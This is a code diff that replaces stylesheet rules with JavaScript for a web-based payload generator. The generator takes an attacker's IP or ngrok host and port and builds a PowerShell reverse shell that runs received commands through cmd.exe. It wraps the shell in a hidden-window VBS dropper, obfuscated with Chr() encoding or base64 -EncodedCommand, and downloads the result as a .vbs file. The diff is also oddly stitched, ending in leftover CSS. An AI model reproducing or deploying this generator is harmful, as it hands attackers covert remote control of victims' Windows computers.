@@ -1,105 +1,157 @@
-:root {
-    --bg-dark: #0a0a12;
-    --bg-darker: #050509;
-    --primary: #5e00ff;
-    --secondary: #00ff9d;
-    --accent: #00b4ff;
-    --danger: #ff00aa;
-    --text: #e0e0e0;
-    --text-muted: #888;
-}
+document.addEventListener('DOMContentLoaded', function() {
+    const modal = document.getElementById('modal');
+    const modalTitle = document.getElementById('modal-title');
+    const modalMessage = document.getElementById('modal-message');
+    const modalClose = document.querySelector('.modal-close');
+    const modalOk = document.getElementById('modal-ok');
+    
+    let currentVbsContent = '';
+    
+    function showModal(title, message, isError = false) {
+        modalTitle.textContent = title;
+        modalMessage.textContent = message;
+        modal.style.display = 'flex';
+        
+        if (isError) {
+            modalTitle.style.color = 'var(--danger)';
+        } else {
+            modalTitle.style.color = 'var(--secondary)';
+        }
+    }
+    
+    modalClose.addEventListener('click', () => {
+        modal.style.display = 'none';
+    });
+    
+    modalOk.addEventListener('click', () => {
+        modal.style.display = 'none';
+    });
+    
+    window.addEventListener('click', (e) => {
+        if (e.target === modal) {
+            modal.style.display = 'none';
+        }
+    });
 
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Consolas', 'Courier New', monospace;
-}
-
-body {
-    background-color: var(--bg-dark);
-    color: var(--text);
-    min-height: 100vh;
-    overflow-x: hidden;
-}
-
-.container {
-    max-width: 800px;
-    margin: 0 auto;
-    padding: 2rem;
-}
-
-header {
-    text-align: center;
-    margin-bottom: 2rem;
-    position: relative;
-}
-
-.title {
-    color: var(--secondary);
-    font-size: 2rem;
-    font-weight: bold;
-    margin-bottom: 0.5rem;
-    text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
-    letter-spacing: 2px;
-}
-
-.author {
-    background: linear-gradient(45deg, var(--accent), var(--secondary));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    font-weight: bold;
-    font-size: 1rem;
-    margin-bottom: 1rem;
-    display: inline-block;
-    cursor: pointer;
-    user-select: all;
-}
-
-.form-group {
-    margin-bottom: 1.5rem;
-}
-
-.form-row {
-    display: flex;
-    align-items: center;
-    margin-bottom: 1rem;
-}
-
-label {
-    color: var(--accent);
-    width: 150px;
-    font-size: 0.9rem;
-}
-
-input[type="text"], 
-input[type="number"],
-textarea {
-    background-color: var(--bg-dark);
-    color: var(--secondary);
-    border: 1px solid var(--primary);
-    border-radius: 3px;
-    padding: 0.8rem;
-    flex: 1;
-    font-size: 0.9rem;
-    transition: all 0.3s ease;
-}
-
-input[type="text"]:focus, 
-input[type="number"]:focus,
-textarea:focus {
-    outline: none;
-    border-color: var(--secondary);
-    box-shadow: 0 0 0 2px rgba(0, 255, 157, 0.2);
-}
-
-textarea {
-    min-height: 200px;
-    resize: vertical;
-    width: 100%;
-}
-
+    function validateIpOrDomain(value) {
+        const ipPattern = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+        const domainPattern = /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$/;
+        const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}$/;
+        return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
+    }
+    
+    function validatePort(port) {
+        return port > 0 && port <= 65535;
+    }
+    
+    function powershellReverseShell(ip, port) {
+        return (
+            `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
+            "$stream = $client.GetStream();" +
+            "$writer = New-Object System.IO.StreamWriter($stream);" +
+            "$buffer = New-Object System.Byte[] 1024;" +
+            "$encoding = New-Object System.Text.ASCIIEncoding;" +
+            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){" +
+            "$command = $encoding.GetString($buffer, 0, $read);" +
+            "$output = cmd.exe /c $command 2>&1 | Out-String;" +
+            "$writer.WriteLine($output);" +
+            "$writer.Flush()" +
+            "}"
+        );
+    }
+    
+    function obfuscateChr(text) {
+        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
+    }
+    
+    function downloadFile(content, filename) {
+        const blob = new Blob([content], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename.endsWith('.vbs') ? filename : `${filename}.vbs`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+    
+    document.getElementById('generate-chr').addEventListener('click', () => {
+        const ip = document.getElementById('ip').value;
+        const port = parseInt(document.getElementById('port').value);
+        
+        if (!validateIpOrDomain(ip)) {
+            showModal('Error', 'Invalid IP/Domain', true);
+            return;
+        }
+        
+        if (!validatePort(port)) {
+            showModal('Error', 'Port must be between 1 and 65535', true);
+            return;
+        }
+        
+        try {
+            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
+            const payload = powershellReverseShell(ip, port);
+            const obfPayload = obfuscateChr(payload);
+            currentVbsContent = (
+                'Set x = CreateObject("WScript.Shell")\n' +
+                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
+            );
+            
+            document.getElementById('vbs-output').value = currentVbsContent;
+            showModal('Success', 'VBS payload generated successfully!');
+        } catch (e) {
+            showModal('Error', `Error: ${e.message}`, true);
+        }
+    });
+    
+    document.getElementById('generate-b64').addEventListener('click', () => {
+        const ip = document.getElementById('ip').value;
+        const port = parseInt(document.getElementById('port').value);
+        
+        if (!validateIpOrDomain(ip)) {
+            showModal('Error', 'Invalid IP/Domain', true);
+            return;
+        }
+        
+        if (!validatePort(port)) {
+            showModal('Error', 'Port must be between 1 and 65535', true);
+            return;
+        }
+        
+        try {
+            const payload = powershellReverseShell(ip, port);
+            const encoder = new TextEncoder();
+            const encoded = btoa(String.fromCharCode(...encoder.encode(payload)));
+            currentVbsContent = (
+                'Set shell = CreateObject("Wscript.Shell")\n' +
+                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
+            );
+            
+            document.getElementById('vbs-output').value = currentVbsContent;
+            showModal('Success', 'VBS payload generated successfully!');
+        } catch (e) {
+            showModal('Error', `Error: ${e.message}`, true);
+        }
+    });
+    
+    document.getElementById('download-btn').addEventListener('click', () => {
+        const filename = document.getElementById('filename').value || 'payload.vbs';
+        
+        if (!currentVbsContent) {
+            showModal('Error', 'Please generate a payload first', true);
+            return;
+        }
+        
+        try {
+            downloadFile(currentVbsContent, filename);
+            showModal('Success', `File ${filename} downloaded successfully!`);
+        } catch (e) {
+            showModal('Error', `Error downloading file: ${e.message}`, true);
+        }
+    });
+});
 .btn {
     background-color: transparent;
     color: var(--text);
